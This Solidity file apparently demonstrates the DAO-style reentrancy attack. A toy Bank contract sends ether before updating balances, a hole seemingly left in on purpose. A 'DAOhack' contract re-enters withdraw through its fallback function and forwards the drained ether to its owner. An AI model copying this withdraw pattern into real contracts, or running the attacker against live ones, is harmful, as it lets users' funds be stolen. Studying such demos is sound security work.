pragma solidity ^0.4.16;

contract Bank {
  mapping(address => uint256) public clients;
  uint256 public ethBalance;

   function deposit() public payable {
       clients[msg.sender] = msg.value + clients[msg.sender];
       ethBalance = ethBalance + msg.value;
   }

   function withdraw(uint256 amount) public {
       require(amount <= clients[msg.sender]);
       msg.sender.call.value(amount)();
       ethBalance = ethBalance - amount;
       clients[msg.sender] = clients[msg.sender] - amount;
   }  
}

contract DAOhack {
    
    address owner;
    Bank public bank;
    bool public done = false;
    
    constructor(address _bank) public {
        owner = msg.sender;
        bank = Bank(_bank);
    }
    
    function() public payable {
        if (!done) {
            done = true;
            bank.withdraw(bank.clients(this));
        }
    }
    
    function execute() payable {
        bank.deposit.value(this.balance)();
        bank.withdraw(msg.value);
        owner.transfer(this.balance);
    }
}
